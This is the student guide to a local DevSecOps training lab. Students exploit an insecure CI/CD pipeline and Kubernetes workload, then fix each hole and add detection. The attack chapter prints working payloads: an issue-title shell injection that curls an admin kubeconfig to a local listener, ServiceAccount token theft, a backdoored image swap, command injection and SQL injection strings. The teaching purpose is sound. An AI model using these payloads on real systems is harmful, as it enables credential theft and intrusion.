# The DevSecOps Lab — Full Student Guide

Welcome. This is the one document to read from top to bottom. It tells you
**what you are building, why, and — for the attack part — exactly how each hack
works**, step by step.

- Need the commands for a step? Each part links to its lab file (`labs/partN.md`).
- Setting up your machine? See [`STUDY_GUIDE.md`](STUDY_GUIDE.md) section 3, or
  just run **`make doctor`** and fix whatever it marks with ✘.

> **One rule for the whole course.** The attack chapters are real exploits, but
> they only ever run against **your own** kind cluster and a listener on
> `127.0.0.1` (your own laptop). Nothing leaves your machine. Never point these
> techniques at a system you do not own.

---

## 1. What this course is

You build a normal CI/CD pipeline, **break into it like an attacker**, then
rebuild it as a security-first (DevSecOps) pipeline that **detects and responds**
to the next attack — with an AI assistant doing the triage. Everything runs
locally on a real Kubernetes cluster. No cloud account, no bill.

```
 build  ─────────▶  attack  ─────────▶  govern  ─────────▶  detect & respond
 (Part 1)           (Part 2)           (Part 3)            (Part 4)
 plain CI/CD        own the pipeline   close every hole    audit log + AI
                    & the pod          OIDC · PSA · OPA    incident + build doctor
```

### Why attack *before* you defend

Most security courses hand you a checklist of controls and you apply them on
faith. Here you do it the other way round: in **Part 2 you exploit the insecure
pipeline** — you steal its cluster credential, take over a running pod, and
swap the image out from under it. Then in **Part 3 each control you add closes
a specific door you just walked through.** You never add a control you can't
explain, because you have felt the attack it stops.

### What you will know at the end

- the full CI/CD lifecycle and **where each stage gets attacked** (OWASP CI/CD
  Top 10);
- **security-first architecture**: least privilege, short-lived federated
  identity, signed immutable artifacts, admission control, defence in depth;
- **detection & response**: audit logging, runtime detection, and using an LLM
  to triage findings and write incident reports.

### The app

`kubenotes` — a tiny Flask notes app. It is deliberately simple: the app is not
the point, the **pipeline around it** is. You will see two versions of its
deployment:

- `k8s/insecure/` — the Part 1 baseline: runs as root, writable filesystem, an
  over-powered token mounted inside the pod, deployed by a mutable tag. Every
  one of those is a door Part 2 opens.
- `k8s/base/` + `k8s/overlays/` — the Part 3 hardened version: non-root,
  read-only filesystem, no token in the pod, deployed by immutable digest.

---

## 2. Before you start (once)

You need **eight** tools: `docker`, `kind`, `kubectl`, `git`, `make`, `gh`
(GitHub CLI), `python3`, and `cosign`. Every *scanner* (Trivy, Semgrep,
Gitleaks, ZAP, Kubescape…) runs as a container, so you never install those.

1. Install the eight tools — [`STUDY_GUIDE.md`](STUDY_GUIDE.md) section 3 has the
   exact commands for macOS, Linux, and Windows (WSL2).
2. **Windows users: work inside WSL2**, in your Linux home (`~`), *never* under
   `/mnt/c/...`. Section 3b explains why and how.
3. Give the machine room: **~8 GB of free RAM** for Docker/WSL. On 4–6 GB it
   runs, but close other apps and expect the heavy scanners to be slow.
4. Get the course and make it your own repository:

   ```bash
   NAME=yourname   # your first name, lowercase, e.g. alice
   git clone https://github.com/DevOpswith-Kosa/devsecops-lab.git ~/devsecops-course
   ~/devsecops-course/scripts/new-lab-repo.sh ~/practice-lab-$NAME
   cd ~/practice-lab-$NAME
   gh repo create practice-lab-$NAME --private --source . --push
   ```

   GitHub only runs workflows from the **root** of a repo, which is why you work
   in your own fresh repo, not inside the course folder.
5. Check the machine, then bring up the platform:

   ```bash
   make doctor     # tools, versions, Docker, RAM, free ports — fixes printed for any ✘
   make up         # local registry + kind cluster (1–3 min)
   make status
   ```

`make doctor` is your friend all the way through: any time something feels
wrong, run it first.

---

## 3. Part 1 — build a plain CI/CD pipeline

**Goal:** get code from a commit to a running pod, automatically, with no
security gates yet. Full steps: [`labs/part1.md`](labs/part1.md).

What you do:

1. **Lab 3 — do it by hand first.** `make test` (pytest in a container),
   `make build push` (build the image, push to the local registry, print its
   digest), `make deploy-insecure` (apply `k8s/insecure/` to `dev`). Visit
   `http://localhost:8080` — the app is live.
2. **Lab 4 — a self-hosted runner.** GitHub's cloud runners cannot reach a
   cluster that only exists on your laptop, so you register a runner *on your
   machine*: `make runner-install REPO=<you>/practice-lab-<name>` then
   `make runner-start`. (That convenience is also Part 2's first target.)
3. **Lab 5 — automate it.** You store the cluster's admin kubeconfig as a GitHub
   secret and push. The workflow `.github/workflows/10-ci-insecure.yml` runs on
   your runner: test → build → push → deploy to `dev`.

### What you have built — and what is wrong with it

A working pipeline, and five deliberate weaknesses that Part 2 exploits:

| Weakness (Part 1) | Why it's dangerous |
|---|---|
| the runner executes on your machine | any step runs code on your laptop |
| a long-lived admin kubeconfig in a secret | never expires, full cluster-admin, one `echo` from leaking |
| nothing scans code, deps, image, or manifests | known-bad ships freely |
| the pod runs as root with a powerful token inside | a foothold becomes namespace takeover |
| deploy by **mutable tag** (`:dev`) | "what's running" can change silently |

> Read `10-ci-insecure.yml` top to bottom. Every line marked `(!)` is a door.
> It is the only workflow running for now — the secure pipelines wait in
> `ci/workflows/` until you turn them on in Part 3.

---

## 4. Part 2 — the hacking part, step by step

This is the chapter students ask about most, so here is **how each attack
actually works**, not just the command to run. Full command list:
[`labs/part2.md`](labs/part2.md). Read [`attack/README.md`](attack/README.md)
first.

Each attack maps to an OWASP CI/CD Top-10 risk and is fixed later in Part 3.

### 4.0 The attacker box

```bash
attack/attacker-box.sh start      # listens on 127.0.0.1:9000, saves to attack/loot/
```

This is a stand-in for "the attacker's server on the internet." It is a tiny
Python HTTP server that writes **anything sent to it** into `attack/loot/` with
a timestamp. In a real breach this box would be on the internet; the mechanism
is identical. Keeping it on `127.0.0.1` is what makes this safe to practise.

---

### 4.1 Attack A1 — poison the pipeline, steal the cluster credential
**OWASP CICD-SEC-4 (Poisoned Pipeline Execution) + SEC-6 (insufficient credential hygiene).**

This is the headline attack: **one GitHub issue title steals a full
cluster-admin credential.** Here is the whole chain.

**The vulnerable code.** Part 2 adds a "ChatOps" bot
(`attack/workflows/90-chatops-vulnerable.yml`): open an issue whose title
starts with `/status` and it reports cluster status. To do that it keeps the
admin kubeconfig in the job's environment, and — the bug — it drops the
issue **title** straight into a shell:

```yaml
run: |
  echo "Running command: ${{ github.event.issue.title }}"
  echo "$KUBECONFIG_ADMIN" > /tmp/kc && export KUBECONFIG=/tmp/kc
  kubectl -n dev get pods || true
```

GitHub Actions substitutes `${{ github.event.issue.title }}` into the script
**as text, before the shell runs.** So whatever you type as the title becomes
part of the command.

**Step 1 — see the breakout locally (Lab 6), no GitHub needed.** The payload
(`attack/a1-pipeline-injection/payload.txt`) is:

```
/status"; curl -s --data-binary "$KUBECONFIG_ADMIN" http://127.0.0.1:9000/kubeconfig ; echo "
```

Read it as the shell does. The workflow line becomes:

```sh
echo "Running command: /status"; curl -s --data-binary "$KUBECONFIG_ADMIN" http://127.0.0.1:9000/kubeconfig ; echo ""
```

The `";` **closes the `echo`** and starts a new command. That new command
`curl`s the secret kubeconfig to the attacker box. The trailing `; echo "`
swallows the leftover quote so nothing looks broken. `prove-injection-locally.sh`
runs this exact line with a fake secret so you watch the request hit your
attacker box — proof of the breakout before you ever touch GitHub.

**Step 2 — arm it (Lab 7).** Copy `90-chatops-vulnerable.yml` into
`.github/workflows/` and push. The bot is now live on your repo.

**Step 3 — fire it (Lab 8).** `attack/a1-pipeline-injection/exploit.sh` opens an
issue whose **title is the payload**. GitHub sees a new issue → triggers the
workflow → your self-hosted runner executes the injected `curl` → the admin
kubeconfig lands in `attack/loot/`. Watch it arrive:

```bash
attack/attacker-box.sh tail      # the kubeconfig arrives
ls attack/loot/                  # the stolen credential, on disk
cp attack/loot/*kubeconfig* /tmp/stolen-kubeconfig
```

**What you proved.** An attacker who can only *open an issue* — no write access,
no secrets — just walked away with a **full, non-expiring cluster-admin
credential.** Two mistakes combined: untrusted input in a shell (SEC-4) and a
long-lived all-powerful secret sitting in the job (SEC-6).

> **Fixed in Part 3:** Lab 13 removes the injection (pass input through `env:`,
> never into a shell). Lab 12 removes the *prize* — no long-lived kubeconfig
> exists any more; the pipeline authenticates with short-lived OIDC tokens.

---

### 4.2 Attack A2 — own the workload, then the namespace
**OWASP CICD-SEC-6.**

Now use that stolen credential (or the admin one, while learning) against the
**running pod.** The Part 1 deployment runs as root, has a writable filesystem,
and mounts an over-privileged ServiceAccount token.

```bash
attack/a2-pod-compromise/exploit.sh /tmp/stolen-kubeconfig dev
```

The script walks the full takeover, step by step:

1. **Who am I?** `exec` into the pod and run `id` → `uid=0(root)`. The container
   runs as root, so a code-exec bug in the app is instantly root-in-container.
2. **Steal the token.** Read
   `/var/run/secrets/kubernetes.io/serviceaccount/token` — the pod's mounted
   ServiceAccount token. Part 1 mounts it even though the app never uses it.
3. **What can the token do?** `kubectl --token=<stolen> auth can-i --list` —
   Part 1 gave this ServiceAccount `*` on `*`: it can do almost **anything in
   the namespace.**
4. **Read secrets** with the stolen token.
5. **Persistence** — launch a **new rogue pod** (stand-in for a crypto-miner or
   reverse shell) using the stolen token.
6. **Proof** — write `/owned.txt` inside the app's **writable** root filesystem.

A foothold in one pod became control of the whole namespace, because the
workload handed over the keys.

> **Fixed in Part 3:** Lab 11 hardens the workload (non-root, read-only FS,
> `automountServiceAccountToken: false` → **no token to steal**, tight RBAC).
> Lab 15 enforces Pod Security `restricted` cluster-wide; Lab 16 adds Gatekeeper
> admission so a rogue pod is refused.

---

### 4.3 Attack A3 — swap the image without touching git
**OWASP CICD-SEC-5 (artifact integrity).**

The Part 1 pipeline deploys the **mutable tag** `:dev`. Anyone who can push to
the registry can replace what `:dev` points at — no pull request, no pipeline,
no trace in git.

```bash
attack/a3-image-tampering/exploit.sh dev
```

Step by step the script:

1. Builds a **backdoored image** (`Dockerfile.backdoor` — the real app plus a
   planted `/BACKDOOR` file) and **pushes it over the same `:dev` tag.**
2. Restarts the deployment so it pulls the swapped image.
3. Proves the running pod is now the attacker's build (`cat /BACKDOOR`).

"What is deployed" is no longer "what you reviewed." The tag lied.

> **Fixed in Part 3:** Lab 11/CD deploys by **digest** (a hash of the exact
> bytes — it cannot be moved). Lab 17 **signs** each image with cosign and
> **verifies** the signature before deploy. Lab 16 has Gatekeeper require a
> digest in `prod`, so nobody can `kubectl set image …:hotfix` around the
> pipeline.

---

### 4.4 Attack A4 — break in through the app itself (RCE + SQLi)
**OWASP Web Top 10 A03 (Injection).**

A1–A3 attacked the CI/CD *system*. A4 attacks the **application** — over plain
`curl`, with **no stolen credential at all**. It's the reminder that hardening
the pipeline doesn't harden the code running at the end of it.

Arm it first (`attack/a4-app-injection/arm.sh`) — this plants a vulnerable debug
module into the app, rebuilds, and redeploys the insecure workload with
`INSECURE_MODE=1`. Then:

```bash
attack/a4-app-injection/exploit.sh
```

**RCE (command injection).** The `/admin/diag?host=` endpoint runs `ping <host>`
in a shell. The payload `host=;cat /var/run/secrets/kubernetes.io/serviceaccount/token`
ends the ping and starts the attacker's command, so the app reads its **own
mounted ServiceAccount token** and returns it over HTTP — the exact prize A2
stole, now through the app's front door with nothing but curl.

**SQLi.** The `/api/search?q=` endpoint concatenates `q` into the query. `' OR
'1'='1` dumps every note; `' UNION SELECT 1,name,sql FROM sqlite_master--` reads
the schema. Arbitrary SQL, straight from a query string.

> **Fixed in Part 3:** the parameterised query already in `app.py` kills the
> SQLi; removing the debug route kills the RCE; and — defence in depth — the
> hardened pod runs non-root with **no token mounted**, so even a working RCE
> reads nothing. Lab 14's `make scan-sast` (Semgrep + Bandit) flags both the
> `shell=True` and the raw SQL as soon as the module sits in `app/` — the gate
> catches it before it ever ships.

---

### 4.5 Clean up

```bash
attack/reset.sh                   # remove rogue pod, marker files, loot/
attack/attacker-box.sh stop
```

Keep the vulnerable ChatOps workflow for now — Part 3 deletes it in Lab 13, and
in Part 4 you re-run these attacks against the hardened cluster to watch them
**fail or get caught.**

### The scoreboard

| Attack | OWASP CI/CD | The lesson |
|---|---|---|
| A1 injection → stolen kubeconfig | SEC-4, SEC-6 | untrusted input in a pipeline = remote code execution; long-lived creds = total loss |
| A2 pod & namespace takeover | SEC-6 | a weak workload hands the cluster to anyone who reaches it |
| A3 image swap | SEC-5 | mutable tags mean "deployed" ≠ "reviewed" |
| A4 app RCE + SQLi | A03 (Web) | the app is attack surface too; input in a shell or SQL reads pod secrets / the DB |

---

## 5. Part 3 — make it a DevSecOps pipeline

Now close every door. **Each lab is one control, and each control maps to an
attack you just ran.** After each one, re-run the matching attack and watch it
fail. Full steps: [`labs/part3.md`](labs/part3.md).

Everything is a `make` target that runs the **same containerised scanner
locally and in CI**, so "green on my laptop" means "green in the pipeline."

| Lab | Control | Closes |
|---|---|---|
| 11 | harden the workload: non-root, read-only FS, **no SA token**, tight RBAC | A2 |
| 12 | **OIDC federation** — the cluster trusts short-lived GitHub tokens instead of a stored kubeconfig | A1's prize |
| 13 | remove the injection; pass input through `env:`, never a shell | A1 |
| 14 | turn on the scans (secrets, SAST, deps, IaC, policy) and the secure pipeline | shifts everything left |
| 15 | enforce **Pod Security `restricted`** cluster-wide | A2, any insecure pod |
| 16 | **OPA Gatekeeper** admission: allowed registries, no `:latest`, digests in prod | A2 rogue pod, A3 |
| 16b | measure against standards: **Kubescape** (NSA/MITRE) + **kube-bench** (CIS) | the gap you can't see |
| 17 | **sign and verify** images with cosign | A3 |
| 17b | **DAST** — OWASP ZAP drives the running app like an attacker | the live app |

The big idea of Part 3 is **defence in depth**: no single control saves you.
A1 is beaten by *both* fixing the injection *and* removing the long-lived
credential. A2 is beaten by a hardened pod *and* Pod Security *and* Gatekeeper.
Each layer catches what the others miss.

**Lab 12, OIDC, is the centrepiece.** Instead of a stealable admin kubeconfig,
the cluster trusts GitHub's identity provider and accepts short-lived, scoped
tokens: the API server checks the token came from **your** repo, on **main**,
bound to the **dev** or **prod** environment, and maps it to a least-privilege
Role in that one namespace. A `dev` token cannot touch `prod`. There is no
longer any credential to steal — which is why re-running A1 after Lab 12 finds
nothing worth taking.

---

## 6. Part 4 — detect & respond, with AI

Prevention fails eventually. This part is about **knowing** when it does and
turning raw signals into something a human can act on fast. Full steps:
[`labs/part4.md`](labs/part4.md).

Three detection sources, all already running: the **Kubernetes API audit log**
(wired up by `make up`), **Gatekeeper audit**, and the **scanners** from Part 3.

- **Lab 18 — detect.** Re-run an attack against the hardened cluster, then
  `make audit` (raw log) and `make detect`. `detect/detect.py` turns the log
  into ranked findings: a shell opened in a pod (`RUNTIME-EXEC`), secret reads
  (`SECRET-ACCESS`), rogue pods, RBAC changes, and a pipeline identity acting in
  the wrong environment (`OIDC-CROSS-ENV`). Controls that **denied** the
  attacker show up as `INFO` — your Part 3 defences, working, on the record.
- **Lab 19 — AI incident report.** `make incident` hands the findings to an LLM
  that writes a summary, timeline, blast radius, containment commands, and the
  one control that would have prevented it. `make incident ALERT=--alert` also
  opens a GitHub issue.
- **Lab 20 — AI build doctor.** On any CI failure, `30-ai-build-doctor.yml`
  posts a root-cause + fix diagnosis instead of making you read 500 log lines.
  Try it locally: `make ai-doctor LOG=reports/build.log`.
- **Lab 21 — AI security triage.** `make triage` turns a wall of scanner output
  into a ranked, deduplicated fix list judged by real exploitability.

> The AI tools use Claude. Set `ANTHROPIC_API_KEY` to get generated answers.
> **Without a key you can still do Part 4** — each tool prints the exact prompt
> it *would* send, so you follow the inputs and reasoning either way.

---

## 7. Teaching notes & troubleshooting

- **Run `make doctor` whenever anything looks wrong.** It checks tools,
  versions, Docker, RAM, free ports, and prints the exact fix.
- **Memory.** The scanners (especially Semgrep, Trivy image scan, ZAP) are
  memory-hungry. On a 4–8 GB machine, run them one at a time and expect the
  first run of each to be slow (it pulls the container image). If a scan is
  killed, close other apps or raise WSL's memory (`.wslconfig`, see
  `STUDY_GUIDE.md` 3b step 3) and run that one target again.
- **Windows.** Always work inside WSL2 in your Linux home, never `/mnt/c/...`.
- **The self-hosted runner needs ICU** on Linux (`libicu-dev`); `make doctor`
  warns if it's missing.
- **One cluster, many labs.** If you also run other kind/minikube clusters,
  stop them while you work here (`docker stop <name>`; data is kept).

### The one-line map of the whole course

> **Static** (SAST / SCA / IaC / config) → **build** → **sign** → **admission**
> → **DAST** on the live app → **detection** → **AI triage & response.**
> Each layer sees something the others can't. You attacked every gap first, so
> you know exactly why each layer is there.

Happy hacking — and happy defending.
